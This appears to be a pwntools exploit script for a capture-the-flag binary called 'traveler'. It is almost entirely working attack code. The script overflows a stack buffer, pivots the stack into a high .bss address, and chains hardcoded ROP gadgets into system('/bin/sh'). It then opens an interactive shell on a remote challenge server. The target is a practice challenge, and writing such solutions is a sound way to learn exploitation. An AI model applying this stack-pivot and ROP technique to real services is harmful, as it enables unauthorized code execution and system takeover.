# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    vuln: stack overflow 0x10 bytes in read(0, buf, 0x30uLL); in main()

exp: stack migration to bss high addr, ROP to system('/bin/sh')
1.stack migrating (II) rbp to bss high addr
2.ret to read_syscall_1 in main to read ROP system('/bin/sh') to bss high addr
3.migrating stack (I) rsp to bss high addr to ROP system('/bin/sh')
4.test for remote server bss high addr offset is larger than 0xD00
'''
from pwn import *


# define the context
binary_name = './traveler'
libc_name = '' if args.REMOTE \
        else ''
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 28584)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        # brva 
        b main
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
high_offset = 0xD00 # must be larger than 0xD00 for remote server
pop_rdi_gadget = 0x00000000004012c3
pop_rsi_r15_gadget = 0x00000000004012c1
leave_ret_gadget = 0x0000000000401253
ret_gadget = 0x000000000040101a
msg_addr = 0x00000000004040A0
read_syscall_1 = 0x0000000000401216
# read_syscall_2 = 0x0000000000401244

payload = cyclic(0x20)
payload += p64(elf.bss(high_offset + 0x20)) + p64(read_syscall_1)
sa(b'who r u?\n', payload)
# pause()
# notice that directly ROP in bss the stack fram is not enough for system('/bin/sh')
# this time the stack is at bss and will overlap with got table
payload = flat({0x00: b'/bin/sh\x00'}, length=0x28)
sa(b'life?\n', payload)

payload = flat([
    p64(pop_rdi_gadget),
    p64(msg_addr),
    p64(elf.plt['system']),
    p64(ret_gadget),
    p64(elf.bss(high_offset - 0x8)),
    p64(leave_ret_gadget)
])
sleep(0.1)
sn(payload)

payload = flat({0x00: b'/bin/sh\x00'}, length=0x28)
# payload = flat({0x00: b'cat flag\xa0'}, length=0x28)
sa(b'life?\n', payload)

# interact with the shell
io.interactive()
